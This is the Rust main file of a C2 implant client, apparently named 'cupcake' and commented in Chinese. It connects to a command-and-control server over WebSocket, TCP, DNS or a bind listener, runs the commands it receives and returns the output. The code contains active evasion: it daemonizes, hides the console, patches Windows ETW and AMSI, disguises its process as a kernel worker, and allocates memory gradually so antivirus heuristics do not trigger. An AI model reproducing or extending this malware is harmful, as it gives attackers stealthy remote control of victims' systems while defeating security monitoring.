// C2 Client Agent - 主程序入口
// 
// 这是一个轻量级的 C2 受控端程序，通过多种传输协议连接到服务端，
// 接收并执行命令，然后将结果返回给服务端。
//
// 核心特性：
// - 多协议支持（WebSocket、TCP、DNS 等）
// - 条件编译：使用 Cargo Features 按需编译协议
// - 指数退避自动重连
// - 零 panic 错误处理
// - 跨平台命令执行
// - 异步 I/O
// - 可修补的服务器配置

// Windows: Enabled for debugging
#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
 
  #[allow(unused_imports)]
  use cupcake_core::{Result, stealth};
  #[allow(unused_imports)]
  use log::info;
 
 #[cfg(target_os = "linux")]
fn daemonize() {
    unsafe {
        // 第一阶段 fork：创建子进程
        match libc::fork() {
            -1 => return, // 错误
            0 => {},      // 子进程继续
            _ => std::process::exit(0), // 父进程退出
        }
        
        // 创建新会话，摆脱控制终端
        libc::setsid();
        
        // 第二阶段 fork：确保不会重新获取控制终端
        match libc::fork() {
            -1 => return,
            0 => {},
            _ => std::process::exit(0),
        }
        
        // 重定向标准流到 /dev/null
        if let Ok(dev_null) = std::fs::File::open("/dev/null") {
            use std::os::unix::io::AsRawFd;
            let fd = dev_null.as_raw_fd();
            libc::dup2(fd, 0);
            libc::dup2(fd, 1);
            libc::dup2(fd, 2);
        }
    }
}

fn main() {
    // 🚀 Linux 自主后台化 (Daemonization)
    #[cfg(target_os = "linux")]
    daemonize();

    // 💥 Global Panic Hook: Verbose in debugging
    std::panic::set_hook(Box::new(|info| {
        // Safe to leave as backup if redirected, or can be removed
    }));

    // Seed PRNG
    let seed = match std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
        Ok(d) => d.as_nanos() as u64,
        Err(_) => 0x1337BEEF1337BEEF_u64,
    };
    cupcake_core::utils::seed_rng(seed);
    
    let delay = (cupcake_core::utils::next_u32() % 4) + 1; 
    std::thread::sleep(std::time::Duration::from_secs(delay as u64));
 
    // 1. [Benign] Initial pattern load (looks like config parsing)
    for _ in 0..3 {
        // Mock legitimate-looking initialization
        cupcake_core::utils::junk_data_collector();
        std::thread::sleep(std::time::Duration::from_millis(500));
    }

    // 2. [Anti-Analysis & Evasion] Stealthy Memory Ballooning
    // Allocate memory progressively to avoid triggering local AV memory-spike heuristics.
    {
        let mut _balloon: Vec<Vec<u8>> = Vec::new();
        let mut allocated = 0;
        let target = 2 * 1024 * 1024; // 2MB Light ballooning
        
        while allocated < target {
            let chunk_size = (cupcake_core::utils::next_u32() % (512 * 1024) + 256 * 1024) as usize;
            let mut chunk = vec![0u8; chunk_size];
            for i in (0..chunk_size).step_by(8192) {
                chunk[i] = (i % 255) as u8;
            }
            _balloon.push(chunk);
            allocated += chunk_size;
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
    }

    // 3. [Debug] DON'T Hide Console -> NOW HIDE
    stealth::hide_console();

    // 4. [Anti-Analysis] Patch ETW and AMSI (Windows only)
    #[cfg(target_os = "windows")]
    {
        stealth::patch_etw();
        stealth::patch_amsi();
    }

    // 9. Backgrounding and Name Spoofing (Linux)
    #[cfg(target_os = "linux")]
    {
        stealth::spoof_process_name("kworker/u2:1-events");
    }

    // 5. Extra Stabilization 
    std::thread::sleep(std::time::Duration::from_millis(3000));

    // 11. Spawn agent runtime thread
    #[cfg(target_os = "windows")]
    {
        unsafe extern "system" fn agent_thread_proc(_: *mut winapi::ctypes::c_void) -> u32 {
            let rt = match tokio::runtime::Runtime::new() {
                    Ok(r) => r,
                    Err(_) => return 1,
                };

            rt.block_on(async {
                let _ = run().await;
            });
            
            0
        }
        
        unsafe {
            let h_thread = winapi::um::processthreadsapi::CreateThread(
                std::ptr::null_mut(),  // lpThreadAttributes
                8 * 1024 * 1024,       // dwStackSize: 8MB
                Some(agent_thread_proc),
                std::ptr::null_mut(),  // lpParameter
                0,                     // dwCreationFlags: run immediately
                std::ptr::null_mut(),  // lpThreadId
            );
            
            if h_thread.is_null() {
                return;
            }
            
            // Wait indefinitely for our agent thread to finish
            winapi::um::synchapi::WaitForSingleObject(h_thread, winapi::um::winbase::INFINITE);
            winapi::um::handleapi::CloseHandle(h_thread);
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let rt = tokio::runtime::Runtime::new().expect("Failed to create tokio runtime");
        rt.block_on(async {
            let _ = run().await;
        });
    }
}

/// 主运行逻辑
async fn run() -> Result<()> {
    // 💤 1. Sleep Delay
    let sleep_secs = cupcake_core::config::get_sleep_time();
    if sleep_secs > 0 {
        tokio::time::sleep(tokio::time::Duration::from_secs(sleep_secs)).await;
    }

    // 🆔 预计算并缓存 Agent UUID
    cupcake_core::get_agent_uuid();
    
    // 1️⃣ WebSocket Entry Point
    #[cfg(feature = "ws")]
    {
        return run_websocket_mode().await;
    }
    
    // 2️⃣ TCP Entry Point (Medium Priority)
    #[cfg(all(feature = "tcp", not(feature = "ws")))]
    {
        return run_tcp_mode().await;
    }
    
    // 3️⃣ DNS Entry Point (Lowest Priority)
    #[cfg(all(feature = "dns", not(any(feature = "ws", feature = "tcp", feature = "tcp_bind"))))]
    {
        return run_dns_mode().await;
    }

    // 4️⃣ TCP Bind Entry Point (New)
    #[cfg(feature = "tcp_bind")]
    {
        info!("Running in TCP Bind (Forward) mode");
        return run_bind_mode().await;
    }
    
    // ⚠️ Safety check: What if no feature is selected?
    #[cfg(not(any(feature = "ws", feature = "tcp", feature = "dns", feature = "tcp_bind")))]
    {
        return Err(ClientError::ConnectionError(
            "no_protocol".to_string()
        ));
    }
}

/// WebSocket 模式运行逻辑
#[cfg(feature = "ws")]
#[allow(dead_code)]
async fn run_websocket_mode() -> Result<()> {
    use cupcake_core::config::{get_server_url, validate_server_url};
    use cupcake_core::transport::create_transport;
    use cupcake_core::{ClientError, Transport};
    
    let server_url = get_server_url();
    // println!("[*] Target C2 Server: {}", server_url);
    
    if !validate_server_url(&server_url) {
        return Err(ClientError::ConnectionError("invalid_target".to_string()));
    }
    
    let mut transport: Box<dyn Transport> = match create_transport(&server_url) {
        Ok(t) => t,
        Err(e) => return Err(e),
    };
    
    // 使用指数退避重连策略（1s -> 2s -> 4s -> ... -> 60s）
    let mut backoff = cupcake_core::ExponentialBackoff::new();
    
    loop {
        if let Err(_e) = transport.connect().await {
            // 连接失败：使用指数退避等待，防止固定间隔被流量分析识别
            tokio::time::sleep(backoff.next_delay()).await;
            continue;
        }
        
        // 连接成功：重置退避计时器
        backoff.reset();
        
        let handler = cupcake_core::BatchMessageHandler::new(transport, None);
        match handler.run().await {
            Ok(returned_transport) => {
                transport = returned_transport;
            }
            Err(_e) => {
                match create_transport(&server_url) {
                    Ok(t) => transport = t,
                    Err(e) => return Err(e),
                }
            }
        }
        // Session 断开：短暂等待后重连
        tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
    }
}

/// TCP 模式运行逻辑
#[cfg(feature = "tcp")]
#[allow(dead_code)]
async fn run_tcp_mode() -> Result<()> {
    use cupcake_core::config::get_server_url;
    use cupcake_core::handler::MessageHandler;
    use cupcake_core::transport::{create_transport, Transport};
    
    let server_url = get_server_url();
    let mut clean_url = server_url.clone();
    
    if clean_url.starts_with("ws://") {
        clean_url = clean_url.replace("ws://", "");
    } else if clean_url.starts_with("wss://") {
        clean_url = clean_url.replace("wss://", "");
    } else if clean_url.starts_with("tcp://") {
        clean_url = clean_url.replace("tcp://", "");
    }

    if let Some(pos) = clean_url.find('/') {
        clean_url = clean_url[..pos].to_string();
    }
    
    let tcp_url = format!("tcp://{}", clean_url);
    
     let mut transport: Box<dyn Transport> = match create_transport(&tcp_url) {
         Ok(t) => t,
         Err(e) => {
             return Err(e);
         }
     };
    
    loop {
        if let Err(_) = transport.connect().await {
            tokio::time::sleep(tokio::time::Duration::from_secs(15)).await;
            continue;
        }
        
        let handler = MessageHandler::new(transport);
        
        match handler.run().await {
            Ok(returned_transport) => {
                transport = returned_transport;
            }
            Err(_) => {
                loop {
                    match create_transport(&tcp_url) {
                        Ok(t) => {
                            transport = t;
                            break;
                        }
                        Err(_) => {
                            tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
                        }
                    }
                }
            }
        }
        
        tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
    }
}

/// DNS 模式运行逻辑
#[cfg(feature = "dns")]
#[allow(dead_code)]
async fn run_dns_mode() -> Result<()> {
    use cupcake_core::config::get_server_url;
    use cupcake_core::handler::MessageHandler;
    use cupcake_core::transport::{create_transport, Transport};
    
    let server_url = get_server_url();
    
    let mut clean_url = server_url.clone();
    
    if clean_url.starts_with("ws://") {
        clean_url = clean_url.replace("ws://", "");
    } else if clean_url.starts_with("wss://") {
        clean_url = clean_url.replace("wss://", "");
    } else if clean_url.starts_with("dns://") {
        clean_url = clean_url.replace("dns://", "");
    }

    if let Some(pos) = clean_url.find('/') {
        clean_url = clean_url[..pos].to_string();
    }
    
    let dns_url = format!("dns://{}", clean_url);
    
    let mut transport: Box<dyn Transport> = match create_transport(&dns_url) {
        Ok(t) => t,
        Err(e) => return Err(e),
    };
    
    loop {
        if let Err(_) = transport.connect().await {
            tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
            continue;
        }
        
        let handler = MessageHandler::new(transport);
        
        match handler.run().await {
            Ok(returned_transport) => {
                transport = returned_transport;
            }
            Err(_) => {
                loop {
                    match create_transport(&dns_url) {
                        Ok(t) => {
                            transport = t;
                            break;
                        }
                        Err(_) => {
                            tokio::time::sleep(tokio::time::Duration::from_secs(60)).await;
                        }
                    }
                }
            }
        }
        
        tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
    }
}
/// TCP Bind (正向监听) 模式运行逻辑
#[cfg(feature = "tcp_bind")]
async fn run_bind_mode() -> Result<()> {
    use cupcake_core::config::get_server_url;
    use cupcake_core::handler::MessageHandler;
    use cupcake_core::transport::{create_transport, Transport};

    let bind_addr = get_server_url();
    let mut clean_url = bind_addr.clone();
    
    // 清除一切可能的前缀
    if clean_url.starts_with("ws://") {
        clean_url = clean_url.replace("ws://", "");
    } else if clean_url.starts_with("wss://") {
        clean_url = clean_url.replace("wss://", "");
    } else if clean_url.starts_with("tcp://") {
        clean_url = clean_url.replace("tcp://", "");
    } else if clean_url.starts_with("bind://") {
        clean_url = clean_url.replace("bind://", "");
    }

    // 清除路径部分 (如 /ws)
    if let Some(pos) = clean_url.find('/') {
        clean_url = clean_url[..pos].to_string();
    }

    // 默认绑定所有网卡 (如果原来是 127.0.0.1 或仅包含端口，修正为 0.0.0.0)
    let port = clean_url.split(':').last().unwrap_or(&clean_url);
    let bind_url = format!("bind://0.0.0.0:{}", port);

    let mut transport: Box<dyn Transport> = create_transport(&bind_url)?;

    loop {
        if let Err(_) = transport.connect().await {
            tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
            continue;
        }

        let handler = MessageHandler::new(transport);
        match handler.run().await {
            Ok(returned_transport) => {
                transport = returned_transport;
            }
            Err(_) => {
                transport = create_transport(&bind_url)?;
            }
        }
    }
}
